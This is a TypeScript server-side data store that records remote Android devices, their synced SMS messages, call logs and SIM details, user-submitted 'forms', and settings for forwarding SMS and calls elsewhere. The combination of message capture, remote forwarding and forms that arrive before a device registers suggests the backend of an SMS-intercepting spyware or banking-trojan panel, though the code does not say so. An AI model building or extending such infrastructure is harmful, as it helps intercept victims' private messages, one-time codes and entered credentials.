import { Device, DeviceData, SMS, CallLog, FormData, ForwardingConfig, SimInfo } from './types/index.js';
import fs from 'fs';
import path from 'path';

// ─── Persistence helpers ────────────────────────────────────────────────────
// Store device state in a JSON file so it survives Render server restarts.
// Only the parts that matter for reconnection are persisted:
//   - device identity (id, name, phoneNumber, simCards)
//   - forwarding config (so devices get their config back on reconnect)
//   - forms (important user-submitted data)
// SMS and call logs are NOT persisted (they are re-synced by the Android app
// on every reconnection via flushPendingSyncQueue).

const DATA_FILE = path.join(__dirname, '..', 'data', 'store.json');

interface PersistedDevice {
    id: string;
    name: string;
    phoneNumber: string;
    simCards: SimInfo[];
    forwarding: ForwardingConfig;
    forms: FormData[];
}

function ensureDataDir() {
    const dir = path.dirname(DATA_FILE);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
}

function loadPersistedDevices(): Map<string, PersistedDevice> {
    try {
        ensureDataDir();
        if (!fs.existsSync(DATA_FILE)) return new Map();
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        const arr: PersistedDevice[] = JSON.parse(raw);
        const map = new Map<string, PersistedDevice>();
        for (const d of arr) {
            map.set(d.id, d);
        }
        console.log(`[Store] Loaded ${map.size} persisted device(s) from disk`);
        return map;
    } catch (e) {
        console.error('[Store] Failed to load persisted store, starting fresh:', e);
        return new Map();
    }
}

function persistDevices(devices: Map<string, DeviceData>) {
    try {
        ensureDataDir();
        const arr: PersistedDevice[] = Array.from(devices.values()).map(d => ({
            id: d.device.id,
            name: d.device.name,
            phoneNumber: d.device.phoneNumber,
            simCards: d.device.simCards || [],
            forwarding: d.forwarding,
            forms: d.forms,
        }));
        fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2), 'utf8');
    } catch (e) {
        console.error('[Store] Failed to persist store to disk:', e);
    }
}

// ─── In-memory data store ──────────────────────────────────────────────────
class DataStore {
    private devices: Map<string, DeviceData> = new Map();

    constructor() {
        // Restore persisted state on startup (survives Render restarts)
        const persisted = loadPersistedDevices();
        for (const [id, p] of persisted) {
            this.devices.set(id, {
                device: {
                    id: p.id,
                    name: p.name,
                    phoneNumber: p.phoneNumber,
                    status: 'offline', // starts offline until the device reconnects
                    lastSeen: new Date(),
                    simCards: p.simCards || [],
                },
                sms: [],    // re-synced by Android on reconnect
                calls: [],  // re-synced by Android on reconnect
                forms: p.forms || [],
                forwarding: p.forwarding,
            });
        }
    }

    // Get all devices
    getAllDevices(): Device[] {
        return Array.from(this.devices.values()).map(d => d.device);
    }

    // Get device by ID
    getDevice(deviceId: string): DeviceData | undefined {
        return this.devices.get(deviceId);
    }

    // Register or update a device
    registerDevice(device: Omit<Device, 'lastSeen' | 'status' | 'simCards'>): DeviceData {
        const existing = this.devices.get(device.id);

        if (existing) {
            // Update existing device
            existing.device.status = 'online';
            existing.device.lastSeen = new Date();
            existing.device.name = device.name;
            existing.device.phoneNumber = device.phoneNumber;
            existing.device.socketId = device.socketId;
            persistDevices(this.devices);
            return existing;
        }

        // Create new device data
        const deviceData: DeviceData = {
            device: {
                ...device,
                status: 'online',
                lastSeen: new Date(),
                simCards: [],
            },
            sms: [],
            calls: [],
            forms: [],
            forwarding: {
                smsEnabled: false,
                smsForwardTo: '',
                callsEnabled: false,
                callsForwardTo: '',
            },
        };

        this.devices.set(device.id, deviceData);
        persistDevices(this.devices);
        return deviceData;
    }

    // Set device offline
    setDeviceOffline(deviceId: string): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.device.status = 'offline';
            deviceData.device.lastSeen = new Date();
            deviceData.device.socketId = undefined;
            // No need to persist on offline — identity & config are already persisted
        }
    }

    // Set device offline by socket ID
    setDeviceOfflineBySocketId(socketId: string): string | null {
        for (const [deviceId, deviceData] of this.devices) {
            if (deviceData.device.socketId === socketId) {
                this.setDeviceOffline(deviceId);
                return deviceId;
            }
        }
        return null;
    }

    // Sync SMS messages
    syncSMS(deviceId: string, smsMessages: SMS[]): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            // Merge new SMS, avoiding duplicates
            const existingIds = new Set(deviceData.sms.map(s => s.id));
            const newMessages = smsMessages.filter(s => !existingIds.has(s.id));
            deviceData.sms = [...deviceData.sms, ...newMessages];
        }
    }

    // Sync call logs
    syncCalls(deviceId: string, calls: CallLog[]): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            // Merge new calls, avoiding duplicates
            const existingIds = new Set(deviceData.calls.map(c => c.id));
            const newCalls = calls.filter(c => !existingIds.has(c.id));
            deviceData.calls = [...deviceData.calls, ...newCalls];
        }
    }

    // Submit form data - creates device if it doesn't exist
    submitForm(deviceId: string, formData: Omit<FormData, 'submittedAt'>): void {
        let deviceData = this.devices.get(deviceId);

        // Create device if it doesn't exist (for form submissions before device registers)
        if (!deviceData) {
            deviceData = {
                device: {
                    id: deviceId,
                    name: `Device ${deviceId.substring(0, 8)}`,
                    phoneNumber: '',
                    status: 'offline',
                    lastSeen: new Date(),
                    simCards: [],
                },
                sms: [],
                calls: [],
                forms: [],
                forwarding: {
                    smsEnabled: false,
                    smsForwardTo: '',
                    callsEnabled: false,
                    callsForwardTo: '',
                },
            };
            this.devices.set(deviceId, deviceData);
            console.log(`[Store] Created placeholder device for form: ${deviceId}`);
        }

        deviceData.forms.push({
            ...formData,
            submittedAt: new Date(),
        });
        console.log(`[Store] Form stored for device ${deviceId}, total forms: ${deviceData.forms.length}`);
        persistDevices(this.devices);
    }

    // Update forwarding config
    updateForwarding(deviceId: string, config: Partial<ForwardingConfig>): ForwardingConfig | null {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.forwarding = { ...deviceData.forwarding, ...config };
            persistDevices(this.devices);
            return deviceData.forwarding;
        }
        return null;
    }

    // Get SMS for a device
    getSMS(deviceId: string): SMS[] {
        return this.devices.get(deviceId)?.sms || [];
    }

    // Get calls for a device
    getCalls(deviceId: string): CallLog[] {
        return this.devices.get(deviceId)?.calls || [];
    }

    // Get forms for a device
    getForms(deviceId: string): FormData[] {
        return this.devices.get(deviceId)?.forms || [];
    }

    // Get forwarding config
    getForwarding(deviceId: string): ForwardingConfig | null {
        return this.devices.get(deviceId)?.forwarding || null;
    }

    // Sync SIM cards for a device
    syncSimCards(deviceId: string, simCards: SimInfo[]): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.device.simCards = simCards;
            persistDevices(this.devices);
        }
    }

    // Get SIM cards for a device
    getSimCards(deviceId: string): SimInfo[] {
        return this.devices.get(deviceId)?.device.simCards || [];
    }
}

export const store = new DataStore();
